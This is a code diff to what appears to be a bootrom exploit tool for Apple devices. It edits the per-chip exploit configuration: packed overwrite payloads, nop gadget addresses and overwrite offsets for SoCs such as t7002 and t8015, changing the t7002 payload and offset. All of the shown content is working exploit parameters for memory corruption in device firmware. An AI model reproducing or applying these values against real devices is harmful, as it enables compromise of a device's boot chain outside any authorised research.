@@ -459,7 +459,7 @@ def all_exploit_configs():
   t8011_nop_gadget = 0x10000CD0C
   t8015_nop_gadget = 0x10000A9C4
 
-  t7002_overwrite    = struct.pack('<20xI4x', 0x34000000)
+  t7002_overwrite    = struct.pack('<20xI', 0x46018000)
   s5l8947x_overwrite = struct.pack('<20xI4x', 0x34000000)
   s5l895xx_overwrite = struct.pack('<20xI4x', 0x10000000)
   t800x_overwrite    = struct.pack('<20xI4x', 0x48818000)
@@ -468,7 +468,7 @@ def all_exploit_configs():
   t8011_overwrite    = struct.pack('<32x2Q', t8011_nop_gadget, 0x1800B0800)
   t8015_overwrite    = struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)
 
-  t7002_overwrite_offset    = 0x660
+  t7002_overwrite_offset    = 0x300
   s5l8947x_overwrite_offset = 0x660
   s5l895xx_overwrite_offset = 0x640
   t800x_overwrite_offset    = 0x5C0
